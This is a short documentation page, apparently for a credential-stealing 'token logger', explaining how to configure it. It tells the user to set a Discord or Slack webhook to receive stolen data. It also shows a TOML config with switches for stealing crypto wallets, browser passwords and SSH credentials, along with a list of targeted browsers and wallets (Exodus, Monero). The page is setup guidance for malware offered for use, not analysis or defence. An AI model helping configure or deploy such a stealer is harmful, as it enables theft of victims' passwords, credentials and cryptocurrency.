# Configuration
Here we shall configure the token logger.

## Configuring the logger
In the `Config.toml` file, there is a field called `webhook`. Change this to your Discord / Slac webhook.

We can have extra features in our config, for example logging browser passwords and crypto wallets. The fields should look like this:
```toml
[features]
steal_crypto_wallets = false
steal_browser_passwords = false
steal_shh_credentials = false

[features.browsers]
# You can add more browsers here, if they are supported.
browser_to_steal = ["Firefox", "Chrome", "Opera", "OperaGX", "Vivaldi", "Brave"]

# and much more.
```

The current supported browser's are:
- Firefox
- Chrome
- Brave
- Microsoft Edge

The current supported crypto wallet's are:
- Exodus
- Monero Wallet

If you have finished editing your config, move to the next page.